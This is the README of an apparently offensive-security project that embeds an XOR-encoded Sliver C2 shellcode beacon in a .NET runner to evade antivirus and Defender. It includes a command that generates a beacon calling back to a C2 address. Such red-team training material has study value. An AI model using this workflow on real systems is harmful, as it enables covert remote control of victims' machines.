# Sliver_C#_Runner_XoR 

There is nothing special going on here; these are super basic methods. As of today, this will get caught by most antiviruses and will work around updated Microsoft Defender. 

## Introduction

Welcome to the latest initiative of the Digital Honk Project, focusing on the practical application of cybersecurity techniques within Windows environments. This project adapts methodologies taught in the OSEP course, designed to facilitate the execution of payloads. It underscores the critical importance of comprehending the underlying mechanisms of cybersecurity and ethical hacking practices.

## Key Features

- Execution of shellcode from embedded resources within .NET applications, employing a lighter touch without the AMSI bypass.
- Custom payload encoding schemes designed to sidestep signature-based detection gracefully, just as a goose might avoid detection in a digital pond.
- Demonstrates how to embed digital feathers (payloads) into the pond (application) seamlessly and execute them without ruffling any feathers.

## Getting Started

## Prerequisites
- A Windows environment (Windows 10/11 recommended).
- .NET Framework 4.7.2 or later.
- Visual Studio 2019 or later for development and compilation.

## Setup
1. **Generate Payload**: Use the Sliver C2 framework to generate your shellcode payload:
```bash
sliver> generate --mtls 192.168.45.221:8888 --os windows --arch amd64 --format shellcode --save beacon.bin
```
2. **Encode Payload**: With the Payload-Encoder tool, encode the `beacon.bin` file for embedding within the project:
The process is detailed at Payload-Encoder.
3. **Embed and Compile**: Include the encoded payload (`honk.user.dat`) as an embedded resource and compile the project using Visual Studio.

## Execution
Upon running the compiled application, your digital goose begins its adventure. Watch as it demonstrates the elegance of executing embedded payloads, navigating the waters of cybersecurity with ease and poise.

## Disclaimer

This project is designed for educational and ethical hacking purposes only. Ensure you have explicit authorization to test and use these techniques on any system. The creator and contributors of the Digital Honk Project assume no responsibility for misuse or damages caused by this project.

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Acknowledgments

Special thanks to the Sliver C2 framework for the payload generation capabilities.
Gratitude to the cybersecurity community for the continuous exchange of knowledge and ethical hacking practices.
